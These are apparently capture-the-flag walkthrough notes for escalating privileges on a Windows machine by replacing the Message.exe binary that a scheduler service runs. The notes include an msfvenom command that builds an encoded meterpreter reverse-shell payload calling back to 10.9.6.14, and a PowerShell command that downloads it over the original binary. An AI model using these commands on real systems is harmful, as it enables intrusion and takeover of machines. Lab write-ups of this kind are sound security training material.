We first need to find out who we're running as
`whoami /priv`


---
### NO METASPLOIT
Enumerate running processes and services
`tasklist /svc`


WindowsScheduler is the red flag we are looking for in the services
WService.exe

The hint tells us to look in `c:\program files (x86)`
We look in the `SystemScheduler\events` directory where we find a log file. 

We look at the log file to see it is running `Message.exe` periodically

We can replace Message.exe with our payload

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.6.14 LPORT=4444 -e x86/shikata_ga_nai -f exe -o Message.exe`

Set up a metasploit multi/handler to receive the shell

`powershell -c "Invoke-WebRequest" -Uri 'http://10.9.6.14:80/Message.exe' -OutFile 'c:\program files (x86)\systemscheduler\Message.exe'`

We should now have root

